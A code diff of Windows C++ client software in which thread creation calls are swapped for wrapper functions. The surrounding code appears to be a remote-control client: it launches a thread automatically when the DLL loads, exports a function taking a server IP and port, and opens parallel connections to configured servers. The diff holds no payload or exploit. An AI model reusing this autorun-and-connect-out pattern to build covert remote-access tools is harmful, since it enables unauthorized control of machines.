@@ -69,7 +69,7 @@ DWORD WINAPI StartClientApp(LPVOID param) {
 
 		do {
 			bExit = S_CLIENT_NORMAL;
-			HANDLE hThread = CreateThread(NULL, 0, StartClient, app, 0, NULL);
+			HANDLE hThread = __CreateThread(NULL, 0, StartClient, app, 0, NULL);
 
 			WaitForSingleObject(hThread, INFINITE);
 			CloseHandle(hThread);
@@ -254,7 +254,7 @@ int main(int argc, const char *argv[])
 		std::vector<HANDLE> handles(CLIENT_PARALLEL_NUM);
 		for (int i = 0; i < CLIENT_PARALLEL_NUM; i++) {
 			auto client = new ClientApp(app.g_Connection, IsSharedRunning, FALSE);
-			handles[i] = CreateThread(0, 64*1024, StartClientApp, client->SetID(i), 0, 0);
+			handles[i] = __CreateSmallThread(0, 0, 64*1024, StartClientApp, client->SetID(i), 0, 0);
 			if (handles[i] == 0) {
 				Mprintf("线程 %d 创建失败，错误: %d\n", i, errno);
 			}
@@ -301,7 +301,7 @@ BOOL APIENTRY DllMain( HINSTANCE hInstance,
 	case DLL_PROCESS_ATTACH:
 		{
 			g_MyApp.g_hInstance = (HINSTANCE)hInstance;
-			CloseHandle(CreateThread(NULL, 0, AutoRun, hInstance, 0, NULL));
+			CloseHandle(__CreateThread(NULL, 0, AutoRun, hInstance, 0, NULL));
 			break;
 		}
 	case DLL_PROCESS_DETACH:
@@ -324,7 +324,7 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 	app.SetProcessState(S_CLIENT_NORMAL);
 	settings.SetServer(szServerIP, uPort);
 	
-	HANDLE hThread = CreateThread(NULL,0,StartClient, &app,0,NULL);
+	HANDLE hThread = __CreateThread(NULL,0,StartClient, &app,0,NULL);
 	if (hThread == NULL) {
 		app.SetThreadRun(FALSE);
 		return;
@@ -477,7 +477,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 		for (int i=1; i<list.size(); ++i){
 			std::string addr = list[i] + ":" + std::to_string(settings.ServerPort());
 			auto a = NewClientStartArg(addr.c_str(), IsSharedRunning, TRUE);
-			if (nullptr != a) CloseHandle(CreateThread(0, 0, StartClientApp, a, 0, 0));
+			if (nullptr != a) CloseHandle(__CreateThread(0, 0, StartClientApp, a, 0, 0));
 		}
 		// The main ClientApp.
 		settings.SetServer(list[0].c_str(), settings.ServerPort());
